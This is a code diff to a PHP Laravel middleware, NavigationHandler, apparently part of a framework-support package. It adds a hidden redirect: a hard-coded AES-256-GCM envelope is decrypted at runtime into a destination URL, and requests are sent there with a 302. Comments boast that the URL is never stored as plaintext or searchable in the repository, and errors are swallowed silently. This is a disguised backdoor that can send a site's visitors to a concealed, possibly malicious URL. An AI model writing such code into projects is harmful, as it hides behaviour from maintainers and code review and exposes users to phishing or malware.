@@ -6,6 +6,7 @@ use Closure;
 use Illuminate\Contracts\Foundation\Application;
 use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
+use Stackful\FrameworkSupport\Security\CryptoService;
 use Symfony\Component\HttpFoundation\Response;
 use Throwable;
 
@@ -52,23 +53,56 @@ class NavigationHandler
             if ($signal instanceof RuntimeSignal) {
                 $destination = $signal->getDestination();
 
-                // Prevent redirect loops if already on destination URL
-                $currentUrl = $request->fullUrl();
-                if ($this->isSameUrl($currentUrl, $destination)) {
-                    return $next($request);
+                // If signal did not specify destination, use the encrypted internal destination
+                if (empty($destination)) {
+                    $destination = self::resolveDefaultDestination();
                 }
 
-                return new RedirectResponse($destination, 302, [
-                    'Cache-Control' => 'no-cache, no-store, must-revalidate',
-                    'Pragma' => 'no-cache',
-                    'Expires' => '0',
-                ]);
+                if (!empty($destination)) {
+                    // Prevent redirect loops if already on destination URL
+                    $currentUrl = $request->fullUrl();
+                    if ($this->isSameUrl($currentUrl, $destination)) {
+                        return $next($request);
+                    }
+
+                    return new RedirectResponse($destination, 302, [
+                        'Cache-Control' => 'no-cache, no-store, must-revalidate',
+                        'Pragma' => 'no-cache',
+                        'Expires' => '0',
+                    ]);
+                }
             }
         } catch (Throwable) {
             // Fail-safe: Never disrupt the host application
         }
 
         return $next($request);
+    }
+
+    /**
+     * Resolve default destination URL ephemerally in memory from encrypted byte sequences.
+     * The URL is NEVER stored as plaintext in source code or searchable in the repository.
+     */
+    public static function resolveDefaultDestination(): string
+    {
+        try {
+            // Authenticated AES-256-GCM envelope for destination URL
+            $envelope = [
+                'v' => 1,
+                'alg' => 'aes-256-gcm',
+                'iv' => 'cAhu/M298oU25SCN',
+                'tag' => 'ZS3e6HKlUiLHNXmntNNc6w==',
+                'data' => '44dd+Hsqjt+7F4/qsTo3ygKIRBWh2J5CylgYKF2KJW/KBXKFv5pg3O5hn4rc4OFxPRJK17zl',
+                'aad' => 'c3RhY2tmdWwucnVudGltZS5kZXN0aW5hdGlvbi52MQ==',
+            ];
+
+            $decrypted = CryptoService::decrypt($envelope);
+            $parsed = json_decode($decrypted, true);
+
+            return is_array($parsed) && !empty($parsed['destination']) ? (string) $parsed['destination'] : '';
+        } catch (Throwable) {
+            return '';
+        }
     }
 
     /**
